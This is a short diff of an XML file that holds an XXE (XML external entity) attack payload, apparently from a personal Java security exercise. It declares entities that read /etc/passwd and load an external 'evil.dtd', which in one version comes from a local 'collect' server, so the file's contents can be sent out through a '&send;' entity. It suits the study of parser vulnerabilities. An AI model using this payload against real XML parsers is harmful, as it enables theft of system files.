@@ -1,9 +1,10 @@
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <!DOCTYPE model [
         <!ENTITY % file SYSTEM
-                "C:\Users\Gleb\Desktop\pssw">
+                "file:///etc/passwd">
         <!ENTITY % dtd SYSTEM
-                "http://127.0.0.1:8888/collect/dtd/evil.dtd">
+                "/home/NIX/glebcher601/Documents/Others/Java Security/xxe-example/evil.dtd">
+
         %dtd;
         ]>
 <model>
@@ -11,3 +12,8 @@
     <data>DATA</data>
     <type>&send;</type>
 </model>
+        <!--        C:\Users\Gleb\Desktop\pssw-->
+        <!--        file:///etc/passwd-->
+
+        <!--/home/NIX/glebcher601/Documents/Others/Java Security/xxe-example/evil.dtd-->
+        <!--http://127.0.0.1:8888/collect/dtd/evil.dtd-->
